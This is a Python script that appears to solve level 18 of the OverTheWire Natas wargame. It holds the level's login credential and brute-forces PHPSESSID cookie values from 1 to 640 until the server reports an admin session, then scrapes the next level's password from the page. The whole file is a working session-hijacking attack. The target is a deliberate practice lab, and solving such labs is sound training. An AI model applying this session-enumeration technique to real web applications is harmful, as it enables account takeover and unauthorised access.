import requests
import re

username = "natas18"
password = "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op"
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session() #Maintains a session
#response = session.get(url, auth=(username, password))
for num in range(1,641):
    response = session.post(url,cookies={"PHPSESSID":f"{num}"} , auth=(username, password))
    if "You are an admin" in response.text:
        print(f"Found the admin session: {num}")
        break
print(f"Final Password: {re.findall('Password: (.*)</pre>', response.text)[0]}")
#print(response.text)
